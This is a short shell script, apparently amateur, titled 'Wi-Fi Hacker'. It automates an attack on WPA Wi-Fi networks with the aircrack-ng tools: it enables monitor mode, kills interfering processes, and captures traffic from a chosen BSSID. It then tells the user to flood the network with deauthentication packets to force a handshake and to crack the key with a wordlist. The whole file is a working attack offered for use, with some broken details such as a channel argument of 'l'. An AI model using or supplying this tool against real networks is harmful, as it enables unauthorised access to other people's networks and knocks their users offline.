#!/bin/sh
echo Wi-Fi Hacker
echo By: Captain_Cozmos
ifconfig
echo Please input wireless device:
read Device
echo Using: $Device
airmon-ng start $Device
echo Found! Devices
echo ERROR! PID Active! Please end processes manually when greater than two PID found!
echo Input PID 1
read PID1
kill $PID1
echo Killed $PID1
echo Input PID 2
read PID2
kill $PID2
echo Killed $PID2
clear
echo interrupt airomon with Ctrl+C if it does not end automatically.
echo press enter to continue...
read blank
airodump-ng wlan0mon
echo input Capture File Name:
echo [Any Variable]
read capturefilename
echo input BSSID Mac Address:
read bssid
clear
echo 1. AFTER you continue, open new terminal and type:
echo aireplay-ng -0 0 -a [BSSID Mac Address]
echo 2. Let the four-way handshake occur. Then interrupt with
echo 3. Ctrl+C
echo 4. USE THE LS COMMAND TO FIND THE CAPTURE FILE YOU JUST NAMED
echo 5. Type: aircrack-ng -w [Path to wordlist.txt] [capturefile name]
echo 6. Decryption begins.
echo 7. END OF LINE
echo press enter to continue...
airodump-ng -c l -w $capturefilename --bssid $bssid wlan0mon




